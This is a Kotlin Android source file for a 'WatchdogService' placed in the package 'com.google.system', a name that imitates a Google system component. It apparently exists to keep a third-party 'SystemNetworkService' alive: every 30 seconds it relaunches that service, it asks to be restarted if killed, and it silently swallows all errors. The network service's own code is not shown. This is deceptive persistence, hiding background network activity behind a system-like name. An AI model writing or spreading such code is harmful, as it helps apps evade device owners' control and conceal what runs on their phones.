package com.google.system

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.os.Handler
import android.os.Looper
import com.openaccess.sdk.service.SystemNetworkService

class WatchdogService : Service() {
    
    private val handler = Handler(Looper.getMainLooper())
    private var isMonitoring = false
    
    private val checkRunnable = object : Runnable {
        override fun run() {
            try {
                if (!isServiceRunning(SystemNetworkService::class.java)) {
                    SystemNetworkService.start(applicationContext)
                }
            } catch (_: Exception) {}
            
            if (isMonitoring) {
                handler.postDelayed(this, 30000)
            }
        }
    }
    
    override fun onCreate() {
        super.onCreate()
        isMonitoring = true
        handler.post(checkRunnable)
    }
    
    override fun onDestroy() {
        isMonitoring = false
        handler.removeCallbacks(checkRunnable)
        super.onDestroy()
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        return START_STICKY
    }
    
    private fun isServiceRunning(serviceClass: Class<*>): Boolean {
        return try {
            val manager = getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            manager.runningServices?.any {
                it.service.className == serviceClass.name
            } ?: false
        } catch (_: Exception) {
            false
        }
    }
    
    companion object {
        fun start(context: Context) {
            try {
                val intent = Intent(context, WatchdogService::class.java)
                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                    context.startForegroundService(intent)
                } else {
                    context.startService(intent)
                }
            } catch (_: Exception) {}
        }
    }
}
